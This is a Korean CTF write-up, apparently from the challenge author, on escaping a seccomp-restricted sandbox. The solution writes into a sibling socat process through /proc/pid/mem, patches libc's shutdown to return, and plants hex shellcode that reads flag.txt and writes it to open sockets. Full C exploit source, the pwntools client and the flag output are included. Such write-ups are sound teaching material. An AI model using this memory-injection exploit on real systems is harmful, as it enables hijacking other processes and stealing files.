# system_vuln

# Usage

# Concept

- 권한 설정 오류
- /proc/pid/mem, maps

# Writeup

문제는 매우 심플하게 쉘코드를 실행할 수 있는 문제이다. seccomp 필터로 `socket` 시스템 콜의 실행을 허용하지 않는다. 

```cpp
seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(socket), 0);
```

추가적으로 docker 내부에서 `connect` , `sendto` 시스템콜을 사용할 수 없다. TCP/UDP 리버스 쉘의 실행을 막는 용도이다. 

```json
{
    "defaultAction": "SCMP_ACT_ALLOW",
    "syscalls": [
        {
            "names": ["connect", "sendto"],
            "action": "SCMP_ACT_ERRNO"
        }
    ]
}
```

또한 문제에서 fd 1, 2 를 닫기 때문에 더이상의 출력을 보는 것은 불가능하다. 아무 설정도 안하면 fd 0으로 출력이 가능하지만, socat의 -u 옵션을 통해서 이를 막았다. -u 옵션을 적용시 바이너리가 출력하는 데이터가 서버의 socat 프로세스에서 출력된다

```python
osori@DESKTOP-R4ES5NB:system_vuln$ socat -u -T 10 TCP-LISTEN:15253,reuseaddr EXEC:./system
[Super Safe Sandbox]
code > 
```

문제의 출제의도는 시스템 자체의 권한설정 문제를 파악하여 socat 프로세스를 해킹하는 것이다. 이 문제에서 socat 프로세스는 sandbox 라는 유저 권한으로 동작하고, 문제 또한 sandbox 권한으로 실행된다.

```cpp
UID          PID    PPID  C STIME TTY          TIME CMD
sandbox        1       0  0 15:28 ?        00:00:00 /bin/sh -c ./start.sh
sandbox        7       1  0 15:28 ?        00:00:00 /bin/sh ./start.sh
sandbox        8       7  0 15:28 ?        00:00:00 socat -T 30 TCP-LISTEN:15252,reuseaddr EXEC:/home/sandbox/system,stderr
sandbox        9       0  1 15:42 pts/0    00:00:00 /bin/bash
sandbox       17       9  0 15:42 pts/0    00:00:00 ps -ef
```

리눅스에서 다른 프로세스의 메모리에 접근할 수 있는 가장 쉬운 방법은 /proc/pid/mem 을 이용하는 것이다. 프로세스의 메모리 맵을 파일로 다룰 수 있기 때문에 seek 를 통해서 주소로 이동하고 값을 적기만 하면 된다. /proc/pid/maps를 이용해서 프로세스의 메모리 맵을 알 수 있기 때문에 이를 이용해서 프로세스의 주소공간을 파악할 수 있다. 

플래그를 얻기 위한 방법으로는 바인드쉘 또는 소켓 재사용이 있다. 이 중 후자인 소켓 재사용의 방법으로 문제를 해결하겠다. 

strace 를 이용해서 socat 프로세스의 시스템콜을 트레이싱하면 `shutdown` 으로 소켓을 종료하는 것을 볼 수 있다. 따라서 /proc/pid/mem 을 이용해서 shutdown 함수의 첫번째 바이트를 0xc3(ret) 으로 변경하고, exit 함수에 flag 를 읽고 소켓으로 출력하는 쉘코드를 작성한다. 

```
write(2, "2024/06/09 00:43:35 socat[128841"..., 802024/06/09 00:43:35 socat[128841] E waitpid(): child 128870 exited on signal 11
) = 80
shutdown(6, SHUT_RDWR)                  = 0
shutdown(5, SHUT_RDWR)                  = 0
exit_group(1)                           = ?
+++ exited with 1 +++
```

아래는 C언어 코드이다. 컴파일  gdb 의 dump 기능을 이용하여 main 함수를 덤프하여 shellcode 라는 파일로 만들어주었다. ~~사실 난이도가 hard 인 이유는 쉘코드를 작성하는 귀찮음..~~

```c
#include <sys/mman.h>
#include <linux/memfd.h>
#include <fcntl.h>
#include <sys/syscall.h>

void inject(){
	char buf[0x100];
	int fd;
	char flag[] = "flag.txt";
	asm("lea rdi, [%0];"::"r"(flag));
    asm("mov esi, 0");    
    asm("mov eax, 2");
    asm("syscall"); //open(flag, 0)
	asm("mov [%0], eax"::"r"(&fd):"eax");
	asm("mov edi, %0;"::"r"(fd));
	asm("lea rsi, [%0];"::"r"(buf));
	asm("mov edx, 0x100");
	asm("mov eax, 0;");
	asm("syscall;");//read(fd, buf, 0x100)		
	for (int i = 6; i < 100; i++){
		asm("mov edi, %0;"::"r"(i));
		asm("lea rsi, [%0]"::"r"(buf));    
		asm("mov edx, 0x100");
		asm("mov eax, 1");
		asm("syscall"); //write(i, buf, 0x100)
	}
}

void main(){        
    const int MMAP = 9;
    const int WRITE = 1;
    int result;        
    char maps[] = "/proc/8/maps";
    char mem[] = "/proc/8/mem";    
    char buf[0x1000];
	//inject 함수를 덤프한 쉘코드
	char code[] = "\x55\x48\x89\xe5\x48\x81\xec\xa8\x0\x0\x0\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x48\x89\x85\xe3\xfe\xff\xff\xc6\x85\xeb\xfe\xff\xff\x0\x48\x8d\x85\xe3\xfe\xff\xff\x48\x8d\x38\xbe\x0\x0\x0\x0\xb8\x2\x0\x0\x0\xf\x5\x48\x8d\x95\xec\xfe\xff\xff\x89\x2\x8b\x85\xec\xfe\xff\xff\x89\xc7\x48\x8d\x85\xf0\xfe\xff\xff\x48\x8d\x30\xba\x0\x1\x0\x0\xb8\x0\x0\x0\x0\xf\x5\xc7\x45\xfc\x3\x0\x0\x0\xeb\x1f\x8b\x45\xfc\x89\xc7\x48\x8d\x85\xf0\xfe\xff\xff\x48\x8d\x30\xba\x0\x1\x0\x0\xb8\x1\x0\x0\x0\xf\x5\x83\x45\xfc\x1\x83\x7d\xfc\x63\x7e\xdb\x90\x90\xc9";
    void* (*syscall)() = 0x4011d6;    
    asm("lea rdi, [%0];"::"r"(maps));
    asm("mov esi, 0");    
    asm("mov eax, 2");
    asm("syscall"); //open(maps, 0)
    asm("mov [%0], eax"::"r"(&result):"eax");
    asm("mov edi, %0;"::"r"(result));
    asm("mov esi, 0x1000;");
    asm("mov edx, 0;"); 
    asm("mov eax, 8;");
    asm("syscall");//lseek(result, 0x2000, 0)
	asm("mov edi, %0;"::"r"(result));
	asm("lea rsi, [%0];"::"r"(buf));
	asm("mov edx, 0x1000");
	asm("mov eax, 0;");
	asm("syscall;");//read(result, buf, 0x1000)		
	size_t addr = 0;
	for (int i = 0; i < 0x1000 - 8; i++){
		size_t* ptr = &buf[i];
		if (*ptr == 0x2e6f732e6362696c){			
			for(int j = 0; j < 12; j++){
				char* end = &buf[i - 0x50 - 19] + j;						
				//16진수를 정수로 변환
				if (*end >= 'a'){
					*end = *end - 'a' + 10;
				}
				else{
					*end -= '0' ;
				}
				addr += *end;
				addr <<= 4;
			}
			addr >>= 4;
			break;
		}
	}
	size_t exit_addr = addr + 0x455f0; //libc 파일에서 얻은 exit 함수의 오프셋
	size_t shudown_addr = addr + 0x0127b00;
	asm("lea rdi, [%0];"::"r"(mem));
    asm("mov esi, 2");    
    asm("mov eax, 2");
    asm("syscall"); //open(mem, 2)
    asm("mov [%0], eax"::"r"(&result):"eax"); //result = eax
    asm("mov edi, %0;"::"r"(result)); 
    asm("lea rsi, [%0];"::"r"(exit_addr));
    asm("mov edx, 0;"); 
    asm("mov eax, 8;");
    asm("syscall");//lseek(result, exit_addr, 0)    
	asm("mov edi, %0;"::"r"(result));
	asm("lea rsi, [%0]"::"r"(code));    
	asm("mov edx, 145");
	asm("mov eax, 1");
	asm("syscall"); //write(result, code, 138)
	code[0] = '\xc3'; //ret
	asm("mov edi, %0;"::"r"(result)); 
    asm("lea rsi, [%0];"::"r"(shudown_addr));
    asm("mov edx, 0;"); 
    asm("mov eax, 8;");
    asm("syscall");//lseek(result, shudown_addr, 0)    
	asm("mov edi, %0;"::"r"(result));
	asm("lea rsi, [%0]"::"r"(code));    
	asm("mov edx, 1");
	asm("mov eax, 1"); //write(result, code, 1)
	asm("syscall");
}

```

파이썬 익스플로잇 코드는 아래와 같다.

```python
from pwn import*
#context.log_level = 'debug'
context.arch = 'amd64'
p = remote('localhost', 15252)
pause()
pl = open('shellcode' ,'rb').read()
p.send(pl)
p.interactive()
```

코드를 실행시 아래와 같이 flag를 얻을 수 있다. 

```python
[+] Opening connection to localhost on port 15252: Done
[*] Paused (press any to continue)
[*] Switching to interactive mode
 hsapce{n0T_0Nly_Ch@1lENGe_BUT_WHo1E_SY$TEM}
```